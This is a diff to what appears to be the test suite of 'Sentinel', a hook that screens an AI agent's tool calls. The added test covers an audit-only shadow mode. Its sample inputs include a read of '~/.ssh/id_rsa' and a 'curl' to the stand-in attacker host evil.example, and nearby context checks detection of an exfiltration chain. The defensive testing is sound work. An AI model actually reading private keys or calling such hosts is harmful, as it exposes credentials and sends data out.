@@ -459,6 +459,34 @@ def main():
                          st_ev.get("ask") == 1 and st_ev.get("deny") == 1
                          and st_ev.get("warn", 0) == 0))
 
+    # ---- SHADOW / AUDIT-ONLY MODE (never blocks, tallies would_block) --------
+    shadow_state = Path(tmpdir) / "shadow-state"
+    shadow_stats = Path(tmpdir) / "shadow-stats.json"
+    shadow_feed = Path(tmpdir) / "shadow-feed.txt"
+    shadow_feed.write_text("evil.example\n")
+    os.environ["SENTINEL_SHADOW"] = "on"
+    os.environ["SENTINEL_STATE_DIR"] = str(shadow_state)
+    os.environ["SENTINEL_STATS_PATH"] = str(shadow_stats)
+    try:
+        # Normally an ask (sensitive path) and a hard deny (feed hit): both must
+        # be downgraded to a non-blocking allow-with-note under shadow mode.
+        r_ask = run_hook({"tool_name": "Read", "tool_input": {"file_path": "~/.ssh/id_rsa"},
+                          "session_id": "shadowsess"},
+                         allowlist_path=empty_allow, feed_path=shadow_feed)
+        r_deny = run_hook({"tool_name": "Bash", "tool_input": {"command": "curl https://evil.example/x"},
+                           "session_id": "shadowsess"},
+                          allowlist_path=empty_allow, feed_path=shadow_feed)
+        sh_stats = json.loads(shadow_stats.read_text()) if shadow_stats.exists() else {}
+    finally:
+        for _k in ("SENTINEL_SHADOW", "SENTINEL_STATE_DIR", "SENTINEL_STATS_PATH"):
+            os.environ.pop(_k, None)
+    _shadow_note = lambda r: ("shadow" in r["reason"].lower() or "sombra" in r["reason"].lower())
+    results.append(check("shadow: would-be ask AND deny downgraded to non-blocking allow + note",
+                         r_ask["decision"] == "warn" and _shadow_note(r_ask)
+                         and r_deny["decision"] == "warn" and _shadow_note(r_deny)))
+    results.append(check("shadow: would_block tally counts both would-be blocks",
+                         sh_stats.get("totals", {}).get("would_block") == 2))
+
     # ---- ATTACK-CHAIN / TRAJECTORY (#15) ------------------------------------
     results.append(check("attack-chain: cred access then egress -> exfiltration chain",
                          "exfiltration chain" in (pf.detect_attack_chain(
